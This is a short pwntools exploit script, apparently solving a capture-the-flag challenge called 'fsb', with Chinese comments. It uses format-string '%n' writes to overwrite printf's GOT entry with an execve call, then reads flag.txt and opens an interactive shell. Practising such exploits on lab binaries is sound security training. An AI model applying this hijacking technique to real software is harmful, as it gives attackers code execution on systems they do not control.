
from pwn import *

e = ELF("./fsb")

printf_got = e.got["printf"]
print printf_got
execve_call = 0x080486ab
print execve_call

# 由于输入的参数在堆上，因此无法通过部署地址到栈上的方式来写入目标地址。
# 写入大量字符会造成输出很多空白字符，因此采用重定向的方式将结果输入到tmp目录下
# > /dev/null 2>&1
p = process("./fsb")
p.recv()
# 把printf的got地址写入第14个参数的位置
payload = "%%%dc" % (printf_got) + "%14$n"
p.sendline(payload)
p.recv()
# 修改printf的got表中的内容为目标地址
payload = "%%%dc" % (execve_call) + "%20$n"
p.sendline(payload)
p.recv()

p.sendline("cat ./flag.txt")
p.recv()

p.interactive()
